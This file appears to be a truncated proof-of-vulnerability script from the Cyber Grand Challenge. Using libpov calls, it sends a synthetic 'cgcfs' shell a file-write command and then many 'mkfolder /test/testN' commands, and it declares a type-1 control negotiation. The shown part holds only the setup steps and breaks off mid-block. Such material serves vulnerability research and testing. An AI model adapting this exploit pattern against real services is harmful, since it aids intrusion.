#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x57\x65\x6c\x63\x6f\x6d\x65\x20\x74\x6f\x20\x74\x68\x65\x20\x63"
         "\x67\x63\x66\x73\x20\x73\x68\x65\x6c\x6c\x21\x0a";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 28);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x25\x20";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 2);
      if (read_00001_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00001_00000[] = 
         "\x54\x79\x70\x65\x20\x68\x65\x6c\x70\x20\x66\x6f\x72\x20\x61\x20"
         "\x6c\x69\x73\x74\x20\x6f\x66\x20\x61\x76\x61\x69\x6c\x61\x62\x6c"
         "\x65\x20\x63\x6f\x6d\x6d\x61\x6e\x64\x73\x2e\x0a";
      read_00001_ptr += cgc_data_match(read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, match_00001_00000, 44);
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x65\x63\x68\x6f\x20\x22\x5c\x78\x30\x30\x5c\x78\x30\x30\x5c\x78"
         "\x30\x30\x5c\x78\x30\x30\x22\x20\x3e\x20\x2f\x74\x65\x73\x74\x66"
         "\x69\x6c\x65\x0a";
      static unsigned int write_00000_00000_len = 36;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x25\x20";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 2);
      if (read_00002_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00002_00000[] = 
         "\x66\x69\x6c\x65\x20\x63\x72\x65\x61\x74\x65\x64\x0a";
      read_00002_ptr += cgc_data_match(read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, match_00002_00000, 13);
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x0a";
      static unsigned int write_00001_00000_len = 15;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x25\x20";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 2);
      if (read_00003_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00003_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00003_ptr += cgc_data_match(read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, match_00003_00000, 18);
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00002_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x30\x0a";
      static unsigned int write_00002_00000_len = 21;
      unsigned char *write_00002 = NULL;
      unsigned int write_00002_len = 0;
      write_00002 = cgc_append_buf(write_00002, &write_00002_len, write_00002_00000, write_00002_00000_len);
      if (write_00002_len > 0) {
         cgc_transmit_all(1, write_00002, write_00002_len);
      }
      cgc_free(write_00002);
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x25\x20";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 2);
      if (read_00004_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00004_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00004_ptr += cgc_data_match(read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, match_00004_00000, 18);
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00003_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x0a";
      static unsigned int write_00003_00000_len = 21;
      unsigned char *write_00003 = NULL;
      unsigned int write_00003_len = 0;
      write_00003 = cgc_append_buf(write_00003, &write_00003_len, write_00003_00000, write_00003_00000_len);
      if (write_00003_len > 0) {
         cgc_transmit_all(1, write_00003, write_00003_len);
      }
      cgc_free(write_00003);
   } while (0);
   do {
      unsigned char *read_00005;
      unsigned int read_00005_len;
      unsigned int read_00005_ptr = 0;
      //**** delimited read
      static unsigned char read_00005_delim[] = 
         "\x25\x20";
      read_00005 = NULL;
      read_00005_len = 0;
      int read_00005_res = cgc_delimited_read(0, &read_00005, &read_00005_len, read_00005_delim, 2);
      if (read_00005_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00005_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00005_ptr += cgc_data_match(read_00005 + read_00005_ptr, read_00005_len - read_00005_ptr, match_00005_00000, 18);
      cgc_free(read_00005);
      if (read_00005_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00004_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x32\x0a";
      static unsigned int write_00004_00000_len = 21;
      unsigned char *write_00004 = NULL;
      unsigned int write_00004_len = 0;
      write_00004 = cgc_append_buf(write_00004, &write_00004_len, write_00004_00000, write_00004_00000_len);
      if (write_00004_len > 0) {
         cgc_transmit_all(1, write_00004, write_00004_len);
      }
      cgc_free(write_00004);
   } while (0);
   do {
      unsigned char *read_00006;
      unsigned int read_00006_len;
      unsigned int read_00006_ptr = 0;
      //**** delimited read
      static unsigned char read_00006_delim[] = 
         "\x25\x20";
      read_00006 = NULL;
      read_00006_len = 0;
      int read_00006_res = cgc_delimited_read(0, &read_00006, &read_00006_len, read_00006_delim, 2);
      if (read_00006_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00006_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00006_ptr += cgc_data_match(read_00006 + read_00006_ptr, read_00006_len - read_00006_ptr, match_00006_00000, 18);
      cgc_free(read_00006);
      if (read_00006_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00005_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x33\x0a";
      static unsigned int write_00005_00000_len = 21;
      unsigned char *write_00005 = NULL;
      unsigned int write_00005_len = 0;
      write_00005 = cgc_append_buf(write_00005, &write_00005_len, write_00005_00000, write_00005_00000_len);
      if (write_00005_len > 0) {
         cgc_transmit_all(1, write_00005, write_00005_len);
      }
      cgc_free(write_00005);
   } while (0);
   do {
      unsigned char *read_00007;
      unsigned int read_00007_len;
      unsigned int read_00007_ptr = 0;
      //**** delimited read
      static unsigned char read_00007_delim[] = 
         "\x25\x20";
      read_00007 = NULL;
      read_00007_len = 0;
      int read_00007_res = cgc_delimited_read(0, &read_00007, &read_00007_len, read_00007_delim, 2);
      if (read_00007_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00007_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00007_ptr += cgc_data_match(read_00007 + read_00007_ptr, read_00007_len - read_00007_ptr, match_00007_00000, 18);
      cgc_free(read_00007);
      if (read_00007_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00006_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x34\x0a";
      static unsigned int write_00006_00000_len = 21;
      unsigned char *write_00006 = NULL;
      unsigned int write_00006_len = 0;
      write_00006 = cgc_append_buf(write_00006, &write_00006_len, write_00006_00000, write_00006_00000_len);
      if (write_00006_len > 0) {
         cgc_transmit_all(1, write_00006, write_00006_len);
      }
      cgc_free(write_00006);
   } while (0);
   do {
      unsigned char *read_00008;
      unsigned int read_00008_len;
      unsigned int read_00008_ptr = 0;
      //**** delimited read
      static unsigned char read_00008_delim[] = 
         "\x25\x20";
      read_00008 = NULL;
      read_00008_len = 0;
      int read_00008_res = cgc_delimited_read(0, &read_00008, &read_00008_len, read_00008_delim, 2);
      if (read_00008_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00008_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00008_ptr += cgc_data_match(read_00008 + read_00008_ptr, read_00008_len - read_00008_ptr, match_00008_00000, 18);
      cgc_free(read_00008);
      if (read_00008_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00007_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x35\x0a";
      static unsigned int write_00007_00000_len = 21;
      unsigned char *write_00007 = NULL;
      unsigned int write_00007_len = 0;
      write_00007 = cgc_append_buf(write_00007, &write_00007_len, write_00007_00000, write_00007_00000_len);
      if (write_00007_len > 0) {
         cgc_transmit_all(1, write_00007, write_00007_len);
      }
      cgc_free(write_00007);
   } while (0);
   do {
      unsigned char *read_00009;
      unsigned int read_00009_len;
      unsigned int read_00009_ptr = 0;
      //**** delimited read
      static unsigned char read_00009_delim[] = 
         "\x25\x20";
      read_00009 = NULL;
      read_00009_len = 0;
      int read_00009_res = cgc_delimited_read(0, &read_00009, &read_00009_len, read_00009_delim, 2);
      if (read_00009_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00009_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00009_ptr += cgc_data_match(read_00009 + read_00009_ptr, read_00009_len - read_00009_ptr, match_00009_00000, 18);
      cgc_free(read_00009);
      if (read_00009_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00008_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x36\x0a";
      static unsigned int write_00008_00000_len = 21;
      unsigned char *write_00008 = NULL;
      unsigned int write_00008_len = 0;
      write_00008 = cgc_append_buf(write_00008, &write_00008_len, write_00008_00000, write_00008_00000_len);
      if (write_00008_len > 0) {
         cgc_transmit_all(1, write_00008, write_00008_len);
      }
      cgc_free(write_00008);
   } while (0);
   do {
      unsigned char *read_00010;
      unsigned int read_00010_len;
      unsigned int read_00010_ptr = 0;
      //**** delimited read
      static unsigned char read_00010_delim[] = 
         "\x25\x20";
      read_00010 = NULL;
      read_00010_len = 0;
      int read_00010_res = cgc_delimited_read(0, &read_00010, &read_00010_len, read_00010_delim, 2);
      if (read_00010_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00010_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00010_ptr += cgc_data_match(read_00010 + read_00010_ptr, read_00010_len - read_00010_ptr, match_00010_00000, 18);
      cgc_free(read_00010);
      if (read_00010_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00009_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x37\x0a";
      static unsigned int write_00009_00000_len = 21;
      unsigned char *write_00009 = NULL;
      unsigned int write_00009_len = 0;
      write_00009 = cgc_append_buf(write_00009, &write_00009_len, write_00009_00000, write_00009_00000_len);
      if (write_00009_len > 0) {
         cgc_transmit_all(1, write_00009, write_00009_len);
      }
      cgc_free(write_00009);
   } while (0);
   do {
      unsigned char *read_00011;
      unsigned int read_00011_len;
      unsigned int read_00011_ptr = 0;
      //**** delimited read
      static unsigned char read_00011_delim[] = 
         "\x25\x20";
      read_00011 = NULL;
      read_00011_len = 0;
      int read_00011_res = cgc_delimited_read(0, &read_00011, &read_00011_len, read_00011_delim, 2);
      if (read_00011_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00011_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00011_ptr += cgc_data_match(read_00011 + read_00011_ptr, read_00011_len - read_00011_ptr, match_00011_00000, 18);
      cgc_free(read_00011);
      if (read_00011_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00010_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x38\x0a";
      static unsigned int write_00010_00000_len = 21;
      unsigned char *write_00010 = NULL;
      unsigned int write_00010_len = 0;
      write_00010 = cgc_append_buf(write_00010, &write_00010_len, write_00010_00000, write_00010_00000_len);
      if (write_00010_len > 0) {
         cgc_transmit_all(1, write_00010, write_00010_len);
      }
      cgc_free(write_00010);
   } while (0);
   do {
      unsigned char *read_00012;
      unsigned int read_00012_len;
      unsigned int read_00012_ptr = 0;
      //**** delimited read
      static unsigned char read_00012_delim[] = 
         "\x25\x20";
      read_00012 = NULL;
      read_00012_len = 0;
      int read_00012_res = cgc_delimited_read(0, &read_00012, &read_00012_len, read_00012_delim, 2);
      if (read_00012_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00012_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00012_ptr += cgc_data_match(read_00012 + read_00012_ptr, read_00012_len - read_00012_ptr, match_00012_00000, 18);
      cgc_free(read_00012);
      if (read_00012_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00011_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x39\x0a";
      static unsigned int write_00011_00000_len = 21;
      unsigned char *write_00011 = NULL;
      unsigned int write_00011_len = 0;
      write_00011 = cgc_append_buf(write_00011, &write_00011_len, write_00011_00000, write_00011_00000_len);
      if (write_00011_len > 0) {
         cgc_transmit_all(1, write_00011, write_00011_len);
      }
      cgc_free(write_00011);
   } while (0);
   do {
      unsigned char *read_00013;
      unsigned int read_00013_len;
      unsigned int read_00013_ptr = 0;
      //**** delimited read
      static unsigned char read_00013_delim[] = 
         "\x25\x20";
      read_00013 = NULL;
      read_00013_len = 0;
      int read_00013_res = cgc_delimited_read(0, &read_00013, &read_00013_len, read_00013_delim, 2);
      if (read_00013_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00013_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00013_ptr += cgc_data_match(read_00013 + read_00013_ptr, read_00013_len - read_00013_ptr, match_00013_00000, 18);
      cgc_free(read_00013);
      if (read_00013_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00012_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x30\x0a";
      static unsigned int write_00012_00000_len = 22;
      unsigned char *write_00012 = NULL;
      unsigned int write_00012_len = 0;
      write_00012 = cgc_append_buf(write_00012, &write_00012_len, write_00012_00000, write_00012_00000_len);
      if (write_00012_len > 0) {
         cgc_transmit_all(1, write_00012, write_00012_len);
      }
      cgc_free(write_00012);
   } while (0);
   do {
      unsigned char *read_00014;
      unsigned int read_00014_len;
      unsigned int read_00014_ptr = 0;
      //**** delimited read
      static unsigned char read_00014_delim[] = 
         "\x25\x20";
      read_00014 = NULL;
      read_00014_len = 0;
      int read_00014_res = cgc_delimited_read(0, &read_00014, &read_00014_len, read_00014_delim, 2);
      if (read_00014_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00014_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00014_ptr += cgc_data_match(read_00014 + read_00014_ptr, read_00014_len - read_00014_ptr, match_00014_00000, 18);
      cgc_free(read_00014);
      if (read_00014_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00013_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x31\x0a";
      static unsigned int write_00013_00000_len = 22;
      unsigned char *write_00013 = NULL;
      unsigned int write_00013_len = 0;
      write_00013 = cgc_append_buf(write_00013, &write_00013_len, write_00013_00000, write_00013_00000_len);
      if (write_00013_len > 0) {
         cgc_transmit_all(1, write_00013, write_00013_len);
      }
      cgc_free(write_00013);
   } while (0);
   do {
      unsigned char *read_00015;
      unsigned int read_00015_len;
      unsigned int read_00015_ptr = 0;
      //**** delimited read
      static unsigned char read_00015_delim[] = 
         "\x25\x20";
      read_00015 = NULL;
      read_00015_len = 0;
      int read_00015_res = cgc_delimited_read(0, &read_00015, &read_00015_len, read_00015_delim, 2);
      if (read_00015_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00015_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00015_ptr += cgc_data_match(read_00015 + read_00015_ptr, read_00015_len - read_00015_ptr, match_00015_00000, 18);
      cgc_free(read_00015);
      if (read_00015_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00014_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x32\x0a";
      static unsigned int write_00014_00000_len = 22;
      unsigned char *write_00014 = NULL;
      unsigned int write_00014_len = 0;
      write_00014 = cgc_append_buf(write_00014, &write_00014_len, write_00014_00000, write_00014_00000_len);
      if (write_00014_len > 0) {
         cgc_transmit_all(1, write_00014, write_00014_len);
      }
      cgc_free(write_00014);
   } while (0);
   do {
      unsigned char *read_00016;
      unsigned int read_00016_len;
      unsigned int read_00016_ptr = 0;
      //**** delimited read
      static unsigned char read_00016_delim[] = 
         "\x25\x20";
      read_00016 = NULL;
      read_00016_len = 0;
      int read_00016_res = cgc_delimited_read(0, &read_00016, &read_00016_len, read_00016_delim, 2);
      if (read_00016_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00016_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00016_ptr += cgc_data_match(read_00016 + read_00016_ptr, read_00016_len - read_00016_ptr, match_00016_00000, 18);
      cgc_free(read_00016);
      if (read_00016_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00015_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x33\x0a";
      static unsigned int write_00015_00000_len = 22;
      unsigned char *write_00015 = NULL;
      unsigned int write_00015_len = 0;
      write_00015 = cgc_append_buf(write_00015, &write_00015_len, write_00015_00000, write_00015_00000_len);
      if (write_00015_len > 0) {
         cgc_transmit_all(1, write_00015, write_00015_len);
      }
      cgc_free(write_00015);
   } while (0);
   do {
      unsigned char *read_00017;
      unsigned int read_00017_len;
      unsigned int read_00017_ptr = 0;
      //**** delimited read
      static unsigned char read_00017_delim[] = 
         "\x25\x20";
      read_00017 = NULL;
      read_00017_len = 0;
      int read_00017_res = cgc_delimited_read(0, &read_00017, &read_00017_len, read_00017_delim, 2);
      if (read_00017_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00017_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00017_ptr += cgc_data_match(read_00017 + read_00017_ptr, read_00017_len - read_00017_ptr, match_00017_00000, 18);
      cgc_free(read_00017);
      if (read_00017_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00016_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x34\x0a";
      static unsigned int write_00016_00000_len = 22;
      unsigned char *write_00016 = NULL;
      unsigned int write_00016_len = 0;
      write_00016 = cgc_append_buf(write_00016, &write_00016_len, write_00016_00000, write_00016_00000_len);
      if (write_00016_len > 0) {
         cgc_transmit_all(1, write_00016, write_00016_len);
      }
      cgc_free(write_00016);
   } while (0);
   do {
      unsigned char *read_00018;
      unsigned int read_00018_len;
      unsigned int read_00018_ptr = 0;
      //**** delimited read
      static unsigned char read_00018_delim[] = 
         "\x25\x20";
      read_00018 = NULL;
      read_00018_len = 0;
      int read_00018_res = cgc_delimited_read(0, &read_00018, &read_00018_len, read_00018_delim, 2);
      if (read_00018_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00018_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00018_ptr += cgc_data_match(read_00018 + read_00018_ptr, read_00018_len - read_00018_ptr, match_00018_00000, 18);
      cgc_free(read_00018);
      if (read_00018_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00017_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x35\x0a";
      static unsigned int write_00017_00000_len = 22;
      unsigned char *write_00017 = NULL;
      unsigned int write_00017_len = 0;
      write_00017 = cgc_append_buf(write_00017, &write_00017_len, write_00017_00000, write_00017_00000_len);
      if (write_00017_len > 0) {
         cgc_transmit_all(1, write_00017, write_00017_len);
      }
      cgc_free(write_00017);
   } while (0);
   do {
      unsigned char *read_00019;
      unsigned int read_00019_len;
      unsigned int read_00019_ptr = 0;
      //**** delimited read
      static unsigned char read_00019_delim[] = 
         "\x25\x20";
      read_00019 = NULL;
      read_00019_len = 0;
      int read_00019_res = cgc_delimited_read(0, &read_00019, &read_00019_len, read_00019_delim, 2);
      if (read_00019_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00019_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00019_ptr += cgc_data_match(read_00019 + read_00019_ptr, read_00019_len - read_00019_ptr, match_00019_00000, 18);
      cgc_free(read_00019);
      if (read_00019_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00018_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x36\x0a";
      static unsigned int write_00018_00000_len = 22;
      unsigned char *write_00018 = NULL;
      unsigned int write_00018_len = 0;
      write_00018 = cgc_append_buf(write_00018, &write_00018_len, write_00018_00000, write_00018_00000_len);
      if (write_00018_len > 0) {
         cgc_transmit_all(1, write_00018, write_00018_len);
      }
      cgc_free(write_00018);
   } while (0);
   do {
      unsigned char *read_00020;
      unsigned int read_00020_len;
      unsigned int read_00020_ptr = 0;
      //**** delimited read
      static unsigned char read_00020_delim[] = 
         "\x25\x20";
      read_00020 = NULL;
      read_00020_len = 0;
      int read_00020_res = cgc_delimited_read(0, &read_00020, &read_00020_len, read_00020_delim, 2);
      if (read_00020_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00020_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00020_ptr += cgc_data_match(read_00020 + read_00020_ptr, read_00020_len - read_00020_ptr, match_00020_00000, 18);
      cgc_free(read_00020);
      if (read_00020_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00019_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x37\x0a";
      static unsigned int write_00019_00000_len = 22;
      unsigned char *write_00019 = NULL;
      unsigned int write_00019_len = 0;
      write_00019 = cgc_append_buf(write_00019, &write_00019_len, write_00019_00000, write_00019_00000_len);
      if (write_00019_len > 0) {
         cgc_transmit_all(1, write_00019, write_00019_len);
      }
      cgc_free(write_00019);
   } while (0);
   do {
      unsigned char *read_00021;
      unsigned int read_00021_len;
      unsigned int read_00021_ptr = 0;
      //**** delimited read
      static unsigned char read_00021_delim[] = 
         "\x25\x20";
      read_00021 = NULL;
      read_00021_len = 0;
      int read_00021_res = cgc_delimited_read(0, &read_00021, &read_00021_len, read_00021_delim, 2);
      if (read_00021_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00021_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00021_ptr += cgc_data_match(read_00021 + read_00021_ptr, read_00021_len - read_00021_ptr, match_00021_00000, 18);
      cgc_free(read_00021);
      if (read_00021_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00020_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x38\x0a";
      static unsigned int write_00020_00000_len = 22;
      unsigned char *write_00020 = NULL;
      unsigned int write_00020_len = 0;
      write_00020 = cgc_append_buf(write_00020, &write_00020_len, write_00020_00000, write_00020_00000_len);
      if (write_00020_len > 0) {
         cgc_transmit_all(1, write_00020, write_00020_len);
      }
      cgc_free(write_00020);
   } while (0);
   do {
      unsigned char *read_00022;
      unsigned int read_00022_len;
      unsigned int read_00022_ptr = 0;
      //**** delimited read
      static unsigned char read_00022_delim[] = 
         "\x25\x20";
      read_00022 = NULL;
      read_00022_len = 0;
      int read_00022_res = cgc_delimited_read(0, &read_00022, &read_00022_len, read_00022_delim, 2);
      if (read_00022_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00022_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00022_ptr += cgc_data_match(read_00022 + read_00022_ptr, read_00022_len - read_00022_ptr, match_00022_00000, 18);
      cgc_free(read_00022);
      if (read_00022_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00021_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x31\x39\x0a";
      static unsigned int write_00021_00000_len = 22;
      unsigned char *write_00021 = NULL;
      unsigned int write_00021_len = 0;
      write_00021 = cgc_append_buf(write_00021, &write_00021_len, write_00021_00000, write_00021_00000_len);
